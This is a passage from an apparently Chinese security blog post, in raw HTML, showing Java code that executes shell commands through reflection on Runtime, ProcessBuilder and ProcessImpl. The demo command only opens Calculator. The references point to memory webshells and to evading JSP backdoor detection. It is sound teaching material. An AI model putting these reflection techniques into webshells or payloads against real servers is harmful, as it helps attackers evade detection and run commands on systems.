<span class="token keyword">void</span> <span class="token class-name">Runtime2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 利用构造函数 private Runtime() &#123;&#125;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><p>使用<code>constructor</code>初始化对象的时候，接收的参数是一个Object数组，所以需要<code>new Object[]</code>强制转换: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessBuilder</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//newInstance接收的是一个Object数组，需要转化一下</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//当使用List类型的构造参数</span>        <span class="token comment">//newInstance接收的是一个Object数组，需要转化一下</span>        <span class="token class-name">ProcessBuilder</span> pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>pb<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessBuilder</span> reflectProcessBuilder <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ReflectProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        reflectProcessBuilder.ReflectPB0();</span>        <span class="token class-name"><span class="token namespace">reflectProcessBuilder<span class="token punctuation">.</span></span>ReflectPB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">relfectDemo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectProcessImpl</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ProcessBuilder<span class="token punctuation">.</span>Redirect</span><span class="token punctuation">[</span><span class="token punctuation">]</span> redirect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> dir <span class="token operator">=</span> <span class="token string">"."</span><span class="token punctuation">;</span>        <span class="token comment">//第四个参数dir不能为空，为空会失败，表示在哪个路径下执行命令</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> map<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ReflectProcessImpl</span> reflectProcess <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectProcessImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name"><span class="token namespace">reflectProcess<span class="token punctuation">.</span></span>ReflectPI0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ForkAndExec"><a href="#ForkAndExec" class="headerlink" title="ForkAndExec"></a>ForkAndExec</h2><p>可以使用ASM执行，参考su18师傅的<a href="https://github.com/su18/JNDI/blob/master/src/main/java/org/su18/asm/payload/Command.java">JNDI</a></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul><li>反射执行命令的时候，首先需要明白如何获取实例的对象，见Runtime执行命令的三种方式</li><li><code>constructor</code>初始化对象的时候，注意参数是Object数组，使用<code>new Object[]</code>强制转换</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xiashang.xyz/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">记一次无文件Webshell攻击分析</a></li><li><a href="https://xz.aliyun.com/t/2342">利用Java反射和类加载机制绕过JSP后门检测</a></li><li><a href="https://xz.aliyun.com/t/10583">从Spring内存马检测到隐形马</a></li><li><a href="https://landgrey.me/blog/12/">基于内存 Webshell 的无文件攻击技术研究</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484259&idx=1&sn=2f132a952ec5e30ecefc9d3acef3cac5&chksm=cf36fb23f8417235ba1b14d9bd5c9efd3f293145b4e3b5a1b771f3a97316f15c0500fbfdb724&scene=132#wechat_redirect">Spring cloud gateway通过SPEL注入内存马</a></li><li><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显</a></li><li><a href="https://www.anquanke.com/post/id/214435">JSP Webshell那些事——攻击篇（上）</a></li><li><a href="https://xz.aliyun.com/t/10535">浅谈加载字节码相关的Java安全问题</a></li><li><a href="https://xz.aliyun.com/t/10075">Java内存攻击技术漫谈</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Runtime&quot;&gt;&lt;a href=&quot;#Runtime&quot; class=&quot;headerlink&quot; title=&quot;Runtime&quot;&gt;&lt;/a&gt;Runtime&lt;/h2&gt;&lt;p&gt;Runtime中可以获取到&lt;code&gt;Runtime&lt;/code&gt;实例有三种方法:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;private static Runtime currentRuntime = new Runtime();&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;public static Runtime getRuntime()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;private Runtime() &amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2022/03/22/java-reflection-shell/2.png&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectRuntime&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//利用私有变量生成实例 private static Runtime currentRuntime = new Runtime();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; field &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;currentRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; field&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//利用     public static Runtime getRuntime() &amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//        return currentRuntime;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//    &amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

